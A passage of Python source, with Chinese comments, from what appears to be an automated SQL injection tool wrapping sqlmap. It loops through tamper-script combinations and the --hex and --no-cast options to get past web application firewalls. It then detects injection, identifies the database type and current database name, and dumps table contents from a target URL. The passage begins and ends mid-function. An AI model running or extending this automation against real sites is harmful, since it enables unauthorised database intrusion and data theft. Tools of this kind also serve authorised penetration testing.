                            update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
                                                         self.sm_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3"])
                            self.output.good_print(
                                "恭喜大爷!!! 使用当前tamper:%s获得了当前数据库的表的列名的具体数据" % tamper_string, 'red')
                            flag = 1

                if flag == 0:
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if self.sm_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(self.sm_command_with_tamper + " --technique=BQT" + 
                                                                 " -T " + table_name + " --dump --stop 3")
                        current_finished_command_list.append(
                            self.sm_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        has_entries = self.get_entries_from_log_file(self.log_file)
                        if has_entries == 1:
                            update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
                                                         self.sm_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3"])
                            self.output.good_print(
                                "恭喜大爷!!! 使用当前tamper:%s获得了当前数据库的表的列名的具体数据" % tamper_string, 'red')
                            flag = 1

                if flag == 0:
                    if self.has_good_sqli_type == 1:
                        current_finished_command_list = eval(get_key_value_from_config_file(
                            self.log_config_file, 'default', 'finished_command_list'))
                        if self.sm_hex_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                            pass
                        else:
                            self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=USE" + 
                                                                     " -T " + table_name + " --dump --stop 3")
                            current_finished_command_list.append(
                                self.sm_hex_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3")
                            update_config_file_key_value(self.log_config_file, 'default',
                                                         'finished_command_list', current_finished_command_list)

                            has_entries = self.get_entries_from_log_file(self.log_file)
                            if has_entries == 1:
                                update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
                                                             self.sm_hex_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3"])
                                self.output.good_print(
                                    "恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前数据库的表的列名的具体数据" % tamper_string, 'red')
                                flag = 1
                                update_config_file_key_value(self.log_config_file, 'default',
                                                             'hex_or_no_cast', ['--hex'])

                    if flag == 0:
                        current_finished_command_list = eval(get_key_value_from_config_file(
                            self.log_config_file, 'default', 'finished_command_list'))
                        if self.sm_hex_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                            pass
                        else:
                            self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=BQT" + 
                                                                     " -T " + table_name + " --dump --stop 3")
                            current_finished_command_list.append(
                                self.sm_hex_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3")
                            update_config_file_key_value(self.log_config_file, 'default',
                                                         'finished_command_list', current_finished_command_list)

                            has_entries = self.get_entries_from_log_file(self.log_file)
                            if has_entries == 1:
                                update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
                                                             self.sm_hex_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3"])
                                self.output.good_print(
                                    "恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前数据库的表的列名的具体数据" % tamper_string, 'red')
                                flag = 1
                                update_config_file_key_value(self.log_config_file, 'default',
                                                             'hex_or_no_cast', ['--hex'])

                    if flag == 0:
                        if self.has_good_sqli_type == 1:
                            current_finished_command_list = eval(get_key_value_from_config_file(
                                self.log_config_file, 'default', 'finished_command_list'))
                            if self.sm_no_cast_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                                pass
                            else:
                                self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command_with_tamper + " --technique=USE" +
                                                                         " -T " + table_name + " --dump --stop 3")
                                current_finished_command_list.append(
                                    self.sm_no_cast_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3")
                                update_config_file_key_value(self.log_config_file, 'default',
                                                             'finished_command_list', current_finished_command_list)

                                has_entries = self.get_entries_from_log_file(self.log_file)
                                if has_entries == 1:
                                    update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
                                                                 self.sm_no_cast_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3"])
                                    self.output.good_print(
                                        "恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前数据库的表的列名的具体数据" % tamper_string, 'red')
                                    flag = 1
                                    update_config_file_key_value(
                                        self.log_config_file, 'default', 'hex_or_no_cast', ['--no-cast'])

                        if flag == 0:
                            current_finished_command_list = eval(get_key_value_from_config_file(
                                self.log_config_file, 'default', 'finished_command_list'))
                            if self.sm_no_cast_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                                pass
                            else:
                                self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command_with_tamper + " --technique=BQT" +
                                                                         " -T " + table_name + " --dump --stop 3")
                                current_finished_command_list.append(
                                    self.sm_no_cast_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3")
                                update_config_file_key_value(self.log_config_file, 'default',
                                                             'finished_command_list', current_finished_command_list)

                                has_entries = self.get_entries_from_log_file(self.log_file)
                                if has_entries == 1:
                                    update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
                                                                 self.sm_no_cast_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3"])
                                    self.output.good_print(
                                        "恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前数据库的表的列名的具体数据" % tamper_string, 'red')
                                    flag = 1
                                    update_config_file_key_value(
                                        self.log_config_file, 'default', 'hex_or_no_cast', ['--no-cast'])

            else:
                # 当前已经获取--hex或者--no-cast选项
                # hex_or_no_cast列表只有一个,如果先检测到--hex选项可以用则不再检测--no-cast选项是否可用
                hex_or_no_cast = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'hex_or_no_cast'))[0]
                if self.has_good_sqli_type == 1:
                    sm_hex_or_no_cast_command_with_tamper = self.sm_command_with_tamper + " " + hex_or_no_cast + " --technique=USE"

                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + 
                                                                 " -T " + table_name + " --dump --stop 3")
                        current_finished_command_list.append(
                            sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --dump --stop 3")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        has_entries = self.get_entries_from_log_file(self.log_file)
                        if has_entries == 1:
                            update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
                                                         sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --dump --stop 3"])
                            self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和已经得到的%s选项获得了当前数据库的表的列名的具体数据" %
                                                   (tamper_string, hex_or_no_cast), 'red')
                            flag = 1

                if flag == 0:
                    sm_hex_or_no_cast_command_with_tamper = self.sm_command_with_tamper + " " + hex_or_no_cast + " --technique=BQT"
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + 
                                                                 " -T " + table_name + " --dump --stop 3")
                        current_finished_command_list.append(
                            sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --dump --stop 3")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        has_entries = self.get_entries_from_log_file(self.log_file)
                        if has_entries == 1:
                            update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
                                                         sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --dump --stop 3"])
                            self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和已经得到的%s选项获得了当前数据库的表的列名的具体数据" %
                                                   (tamper_string, hex_or_no_cast), 'red')
                            flag = 1

            if flag == 1:
                # 下面将当前使用的tamper_string中的tamper写入到tamper_list中,直接写tamper_string中的tamper而不是
                # 先判断tamper_string中是否有tamper_list中不存在的tamper再将不存在的tamper写入tamper_list是因为这
                # 里的tamper_string已经是在tamper_list的基础上形成的最终的tamper_string,因为每次测试tamper时,只要
                # 测到该tamper可用,以后每次新的tamper测试都会在这个可用tamper的基础上再加上新测试的tamper进行测试
                if "," not in tamper_string:
                    # 当前使用的tamper_string只有一个tamper
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'tamper_list', [tamper_string])
                else:
                    # 当前使用的tamper_string有多个tamper
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'tamper_list', tamper_string.split(","))
                # return 1代表当前tamper达到了目的
                return 1

            # return 0代表当前tamper没有达到目的
            return 0

    def get_from_tuple(self, the_tuple):
        out = ""
        for i in range(len(the_tuple)):
            out += (the_tuple[i] + ',')
        return out[:-1]

    def run_all_comb(self, db_list, forwhat, n=0):
        # 为了forwhat的目的进行排列组合绕过waf,达到目的则返回1,否则返回0
        # run_all_comb中的test_tamper_string函数中是有tamper的包括--hex和--no-cast的检测
        # 当前get_(for_what)_need_tamper函数主体代码中是没有tamper的包括--hex和--no-cast的检测
        # n代表几个组合,eg,n=3代表任意3个tamper以内的组合(包含任意1个,任意2个,任意3个tamper的组合)
        # n缺省值为0,代表获取db_list这个列表的长度的值的任意组合
        import itertools
        if n != 0:
            for i in range(1, n + 1):
                tmp_list = list(itertools.combinations(db_list, i))
                for j in range(len(tmp_list)):
                    tamper_string = self.get_from_tuple(tmp_list[j])
                    make_it = self.test_tamper_string(tamper_string, forwhat)
                    self.try_times += 1
                    print(self.try_times)
                    if make_it == 1:
                        # 当前tamper_string成功达到forwhat的目的,退出for循环,并返回1
                        return 1
                    continue
        if n == 0:
            for i in range(1, len(db_list) + 1):
                tmp_list = list(itertools.combinations(db_list, i))
                for j in range(len(tmp_list)):
                    tamper_string = self.get_from_tuple(tmp_list[j])
                    make_it = self.test_tamper_string(tamper_string, forwhat)
                    self.try_times += 1
                    print(self.try_times)
                    if make_it == 1:
                        # 当前tamper_string成功达到forwhat的目的,退出for循环,并返回1
                        return 1
                    continue
        return 0

    def get_log_file_need_tamper(self):
        # 获取log文件所需tamper,当log文件中有内容时说明有sqli,log文件内容为空说明url不存在sqli,进入这个函数代表已经
        # 执行过sm "url"
        # 成功检测到url有sqli漏洞返回1,否则返回0
        # run_all_comb中的test_tamper_string函数中是有tamper的包括--hex和--no-cast的检测
        # 当前get_(for_what)_need_tamper函数主体代码中是没有tamper的包括--hex和--no-cast的检测
        # return 1代表这个函数达到目的了,return 0代表这个函数没有达到目的
        # 如果当前函数没有达到目的则认为目标url不存在sqli漏洞,不再进行当前函数以后的函数检测
        if self.check_log_has_content(self.log_file) == True:
            self.output.good_print(
                "上次已经测试过这个目标url,并且已经得到有内容的log_file了,也即已经检测出该url是有sqli漏洞的,略过当前函数的处理过程", 'red')
            return 1
        else:
            self.output.good_print("正常的注入语句无法检测到有sqli注入", 'green')
            self.output.good_print("尝试用--hex选项再检测是否有sqli注入...", 'green')
            current_finished_command_list = eval(get_key_value_from_config_file(
                self.log_config_file, 'default', 'finished_command_list'))
            if self.sm_hex_command in current_finished_command_list:
                pass
            else:
                self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command)
                current_finished_command_list.append(self.sm_hex_command)
                update_config_file_key_value(self.log_config_file, 'default',
                                             'finished_command_list', current_finished_command_list)

                if self.check_log_has_content(self.log_file) == True:
                    self.output.good_print("恭喜大爷!!! 使用--hex成功检测到了该url有sqli注入", 'red')
                    if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
                        update_config_file_key_value(
                            self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
                    return 1

            self.output.good_print("尝试用--no-cast选项再检测是否有sqli注入...", 'green')
            current_finished_command_list = eval(get_key_value_from_config_file(
                self.log_config_file, 'default', 'finished_command_list'))
            if self.sm_no_cast_command in current_finished_command_list:
                pass
            else:
                self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command)
                current_finished_command_list.append(self.sm_no_cast_command)
                update_config_file_key_value(self.log_config_file, 'default',
                                             'finished_command_list', current_finished_command_list)

                if self.check_log_has_content(self.log_file) == True:
                    self.output.good_print("恭喜大爷!!! 使用--no-cast成功检测到了该url有sqli注入", 'red')
                    if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'hex_or_no_cast', ['--no-cast'])
                    return 1

            self.output.good_print("--hex和--no-cast无果,正在尝试使用每一个非组合tamper检测该url是否有slqi注入...", 'green')
            tamper_list = self.MYSQL + self.MSSQL + self.ACCESS + self.ORACLE + self.SQLITE + \
                self.PGSQL + self.DB2 + self.FIREBIRD + self.MAXDB + self.SYBASE + self.HSQLDB

            for each in tamper_list:
                each_list = [each]
                # 下面为了得到有内容的log_file而进行run_all_comb
                make_it = self.run_all_comb(each_list, 'log_file')
                if make_it == 1:
                    # 下面代表已经获取了有内容的log_file对应的tamper
                    return 1
                else:
                    continue
            # 下面代表尝试每一个非组合tamper无法得到有内容的log_file
            self.output.good_print(
                "sorry,this url is no vulnerable in my eye,I will exit to save your time:)", 'red')
            return 0

    def get_db_type_need_tamper(self):
        # 获取[得到数据库类型,在此之前先进行了有内容的log_file的获取,也即检测出有sqli]所需tamper,
        # 执行到这里说明已经检测到有漏洞了,但是可能没有检测到是什么数据库,于是进入这个函数
        # 如果在进行这个函数之前已经得到了数据库,那么直接返回
        # 成功获取数据库类型返回1,否则返回0
        # run_all_comb中的test_tamper_string函数中是有tamper的包括--hex和--no-cast的检测
        # 当前get_(for_what)_need_tamper函数主体代码中是没有tamper的包括--hex和--no-cast的检测
        # return 1代表这个函数达到目的了,return 0代表这个函数没有达到目的
        self.output.good_print("目前为止已经检测到目标url有sqli漏洞,现在尝试获取数据库类型...", 'yellow')
        db_type = self.get_db_type_from_log_file(self.log_file)
        if db_type != 0:
            self.output.good_print("恭喜大爷,不用进入这个函数尝试获取数据库类型了,在之前的尝试检测出目标url有sqli漏洞的过程中已经得到了数据库类型", 'red')
            return 1
        else:
            # 之前没有得到数据库类型,现在尝试所有的非组合tamper获取数据库类型,直到所有非组合的tamper尝试完毕
            # 这里用于获取数据库类型,所以只尝试每种非组合的tamper,如果尝试完还得不到则默认数据库类型为MySQL
            if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
                # 当前hex_or_no_cast的值为空,没有检测到该用--hex还是--no-cast
                self.output.good_print("尝试用--hex选项再获取数据库类型...", 'green')
                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if self.sm_hex_command in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command)
                    current_finished_command_list.append(self.sm_hex_command)
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    if self.get_db_type_from_log_file(self.log_file) != 0:
                        self.output.good_print("恭喜大爷!!! 使用--hex成功检测到了数据库类型", 'red')
                        update_config_file_key_value(
                            self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
                        return 1

                self.output.good_print("尝试用--no-cast选项再获取数据库类型...", 'green')
                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if self.sm_no_cast_command in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command)
                    current_finished_command_list.append(self.sm_no_cast_command)
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    if self.get_db_type_from_log_file(self.log_file) != 0:
                        self.output.good_print("恭喜大爷!!! 使用--no-cast成功检测到了该url有sqli注入", 'red')
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'hex_or_no_cast', ['--no-cast'])
                        return 1
            else:
                # 当前hex_or_no_cast的值不为空,没有检测到该用--hex还是--no-cast
                # 当前get_db_type_need_tamper函数主体代码中是没有tamper的包括--hex和--no-cast的检测
                hex_or_no_cast = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'hex_or_no_cast'))[0]
                sm_hex_or_no_cast_command = self.sm_command + " " + hex_or_no_cast
                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if sm_hex_or_no_cast_command in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command)
                    current_finished_command_list.append(sm_hex_or_no_cast_command)
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    if self.get_db_type_from_log_file(self.log_file) != 0:
                        self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项检测到了当前url的数据库类型" %
                                               hex_or_no_cast, 'red')
                        return 1

            self.output.good_print("--hex和--no-cast无果,正在尝试使用每一个非组合tamper获取数据库类型...", 'green')
            tamper_list = self.MYSQL + self.MSSQL + self.ACCESS + self.ORACLE + self.SQLITE + \
                self.PGSQL + self.DB2 + self.FIREBIRD + self.MAXDB + self.SYBASE + self.HSQLDB

            for each in tamper_list:
                each_list = [each]
                # 下面为了得到有内容的db_type而进行run_all_comb
                # run_all_comb中的test_tamper_string函数中是有tamper的包括--hex和--no-cast的检测
                make_it = self.run_all_comb(each_list, 'db_type')
                if make_it == 1:
                    # 下面代表已经获取了有内容的db_type对应的tamper
                    return 1
                else:
                    continue
            # 下面代表尝试每一个非组合tamper无法得到有内容的db_type
            # 这里和前一个尝试获取有内容的log_file的处理方法不同,这里在全部非组合tamper尝试完并无法获取
            # 数据库类型的情况下,认为数据库类型是MySQL,在这之后有需要判断数据库类型的地方要先判断,如果
            # get_db_type_from_log_file找到的数据库类型不是MySQL则以get_db_type_from_log_file的返回值为
            # 数据库类型的值,如果找不到数据库类型的值则将数据库类型断定为MySQL
            return 1

    def get_good_sqli_type_need_tamper(self):
        # 获取数据库E|U|S高效注入方法需要的tamper
        # 到这里已经在第一步的获取有内容的log_file函数中得到了数据库的注入方法,但是可能不全,有可能会出现有盲注
        # 但没有错误注入或union注入或堆注入,如果这种高效注入方法在进入这个函数的forwhat='sqli_type'处理代码前
        # 都没有获取到,那么开始尝试所有2种tamper组合以内的组合来尝试获取E|U|S高效注入方法[后来决定再加上几个比较好
        # 的3个以上的tamper组合]
        # eg.MySQL有17种可用的tamper
        # C17[1]+C17[2]+C17[3]=17+136+1360=1513种尝试
        # C17[1]+C17[2]=17+136=153种尝试,所以这里目前取2种任意tamper组合比较合适
        # run_all_comb中的test_tamper_string函数中是有tamper的包括--hex和--no-cast的检测
        # 当前get_(for_what)_need_tamper函数主体代码中是没有tamper的包括--hex和--no-cast的检测
        # return 1代表这个函数达到目的了,return 0代表这个函数没有达到目的

        self.output.good_print("目前为止已经获取到了数据库类型,现在尝试获得任意一种高效U|E|S注入方法...", 'red')

        sqli_type = self.get_sqli_type_from_log_file(self.log_file)
        if 'U' in sqli_type or 'E' in sqli_type or 'S' in sqli_type:
            self.output.good_print("恭喜大爷, 不用进入这个函数尝试获取任意一种高效U|E|S注入方法了, 在之前的尝试检测出目标url有sqli\
    漏洞的过程或者尝试获取数据库类型的过程中已经得到了一种以上的高效U|E|S注入方法", 'red')
            return 1
        else:
            # 之前没有得到一种以上的高效注入方法,现在尝试组合tamper获取任意一种高效U|E|S高效注入方法,按照上面的注释
            # 中的组合方法尝试获取
            if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
                # 当前hex_or_no_cast的值为空,没有检测到该用--hex还是--no-cast
                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if self.sm_command + " --technique=USE" in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(self.sm_command + " --technique=USE")
                    current_finished_command_list.append(self.sm_command + " --technique=USE")
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    sqli_type = self.get_sqli_type_from_log_file(self.log_file)
                    if 'U' in sqli_type or 'E' in sqli_type or 'S' in sqli_type:
                        self.output.good_print("恭喜大爷!!! 不用--hex或--no-cast选项就成功获得了一种以上的高效注入方法", 'red')
                        return 1

                self.output.good_print("尝试用--hex选项获得任意一种高效注入方法...", 'green')
                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if self.sm_hex_command + " --technique=USE" in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command + " --technique=USE")
                    current_finished_command_list.append(self.sm_hex_command + " --technique=USE")
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    sqli_type = self.get_sqli_type_from_log_file(self.log_file)
                    if 'U' in sqli_type or 'E' in sqli_type or 'S' in sqli_type:
                        self.output.good_print("恭喜大爷!!! 使用--hex成功获得了一种以上的高效注入方法", 'red')
                        update_config_file_key_value(
                            self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
                        return 1

                self.output.good_print("尝试用--no-cast选项再获取任意一种高效注入方法...", 'green')
                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if self.sm_no_cast_command + " --technique=USE" in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command + " --technique=USE")
                    current_finished_command_list.append(self.sm_no_cast_command + " --technique=USE")
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    sqli_type = self.get_sqli_type_from_log_file(self.log_file)
                    if 'U' in sqli_type or 'E' in sqli_type or 'S' in sqli_type:
                        self.output.good_print("恭喜大爷!!! 使用--no-cast成功获取了一种以上的高效注入方法", 'red')
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'hex_or_no_cast', ['--no-cast'])
                        return 1
            else:
                # 当前已经获取--hex或者--no-cast选项
                # hex_or_no_cast列表只有一个,如果先检测到--hex选项可以用则不再检测--no-cast选项是否可用
                hex_or_no_cast = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'hex_or_no_cast'))[0]
                sm_hex_or_no_cast_command = self.sm_command + " " + hex_or_no_cast
                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if sm_hex_or_no_cast_command + " --technique=USE" in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command + " --technique=USE")
                    current_finished_command_list.append(sm_hex_or_no_cast_command + " --technique=USE")
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    sqli_type = self.get_sqli_type_from_log_file(self.log_file)
                    if 'U' in sqli_type or 'E' in sqli_type or 'S' in sqli_type:
                        self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项获得了U|E|S一种以上的高效注入方法" %
                                               hex_or_no_cast, 'red')
                        return 1

            self.output.good_print(
                "--hex和--no-cast无果,正在尝试所有2种tamper组合以内的组合再加上几个比较好的3个以上的tamper组合来尝试获取E|U|S高效注入方法", 'green')
            # 下面从log_file文件中获取数据库类型来决定用什么数据库的tamper,如果没有找到数据库类型则用默
            # 认的MySQL数据库类型的tamper
            db_type = eval(get_key_value_from_config_file(self.log_config_file, 'default', 'db_type'))

            if db_type == 'MYSQL':
                db_type_tamper_list = self.MYSQL
            elif db_type == 'MSSQL':
                db_type_tamper_list = self.MSSQL
            elif db_type == 'ORACLE':
                db_type_tamper_list = self.ORACLE
            elif db_type == 'ACCESS':
                db_type_tamper_list = self.ACCESS
            elif db_type == 'SQLITE':
                db_type_tamper_list = self.SQLITE
            elif db_type == 'PGSQL':
                db_type_tamper_list = self.PGSQL
            elif db_type == 'DB2':
                db_type_tamper_list = self.DB2
            elif db_type == 'FIREBIRD':
                db_type_tamper_list = self.FIREBIRD
            elif db_type == 'MAXDB':
                db_type_tamper_list = self.MAXDB
            elif db_type == 'SYBASE':
                db_type_tamper_list = self.SYBASE
            elif db_type == 'HSQLDB':
                db_type_tamper_list = self.HSQLDB
            else:
                print("impossile! check get_good_sqli_type_need_tamper func")

            # 下面为了得到有U|E|S高效注入方法而进行run_all_comb
            make_it = self.run_all_comb(db_type_tamper_list, 'good_sqli_type', 2)
            if make_it == 1:
                # 下面代表已经获取了有内容的db_type对应的tamper
                return 1
            # 下面是任意2种tamper组合以外的比较好的3种以上tamper组合的尝试

            make_it = self.test_tamper_string("randomcase,between,space2dash", 'good_sqli_type')
            if make_it == 1:
                return 1

            make_it = self.test_tamper_string(
                "between,space2randomblank,randomcase,xforwardedfor,charencode", 'good_sqli_type')
            if make_it == 1:
                return 1

            # 下面代表尝试完当前的动作依然没有得到有U|E|S高效注入方法
            return 0

    def get_db_name_need_tamper(self):
        # 得到当前url对应的数据库名所需要的tamper
        # run_all_comb中的test_tamper_string函数中是有tamper的包括--hex和--no-cast的检测
        # 当前get_(for_what)_need_tamper函数主体代码中是没有tamper的包括--hex和--no-cast的检测
        # 上面的这个self.has_good_sqli_type是前一步尝试获取高效注入方法的结果,如果=1说明有高效注入方法
        self.output.good_print("目前为止已经尝试完获取高效注入方法,现在尝试获取当前url的数据库名...", 'red')
        db_name_list = self.get_db_name_from_log_file(self.log_file)
        if db_name_list != 0 and db_name_list != []:
            self.output.good_print("恭喜大爷,不用进入这个函数尝试获取数据库名了,以前已经得到过了", 'red')
            return 1
        else:
            # 之前没有得到数据库名,现在尝试所有的组合tamper获取数据库名,直到所有组合的tamper尝试完毕
            if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
                # 当前hex_or_no_cast的值为空,没有检测到该用--hex还是--no-cast
                if self.has_good_sqli_type == 1:
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if self.sm_command + " --current-db" + " --technique=USE" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(
                            self.sm_command + " --current-db" + " --technique=USE")
                        current_finished_command_list.append(
                            self.sm_command + " --current-db" + " --technique=USE")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        db_name_list = self.get_db_name_from_log_file(self.log_file)
                        if db_name_list != 0 and db_name_list != []:
                            self.output.good_print("恭喜大爷!!! 不用--hex或--no-cast选项就成功得到了当前url的数据库名", 'red')
                            return 1

                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if self.sm_command + " --current-db" + " --technique=BQT" in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(
                        self.sm_command + " --current-db" + " --technique=BQT")
                    current_finished_command_list.append(
                        self.sm_command + " --current-db" + " --technique=BQT")
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    db_name_list = self.get_db_name_from_log_file(self.log_file)
                    if db_name_list != 0 and db_name_list != []:
                        self.output.good_print("恭喜大爷!!! 不用--hex或--no-cast选项就成功得到了当前url的数据库名", 'red')
                        return 1

                self.output.good_print("尝试用--hex选项再获取当前url的数据库名...", 'green')
                if self.has_good_sqli_type == 1:
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if self.sm_hex_command + " --current-db" + " --technique=USE" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(
                            self.sm_hex_command + " --current-db" + " --technique=USE")
                        current_finished_command_list.append(
                            self.sm_hex_command + " --current-db" + " --technique=USE")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        db_name_list = self.get_db_name_from_log_file(self.log_file)
                        if db_name_list != 0 and db_name_list != []:
                            self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前url的数据库名", 'red')
                            update_config_file_key_value(
                                self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
                            return 1

                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if self.sm_hex_command + " --current-db" + " --technique=BQT" in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(
                        self.sm_hex_command + " --current-db" + " --technique=BQT")
                    current_finished_command_list.append(
                        self.sm_hex_command + " --current-db" + " --technique=BQT")
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    db_name_list = self.get_db_name_from_log_file(self.log_file)
                    if db_name_list != 0 and db_name_list != []:
                        self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前url的数据库名", 'red')
                        update_config_file_key_value(
                            self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
                        return 1

                self.output.good_print("尝试用--no-cast选项再获取当前url的数据库名...", 'green')
                if self.has_good_sqli_type == 1:
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
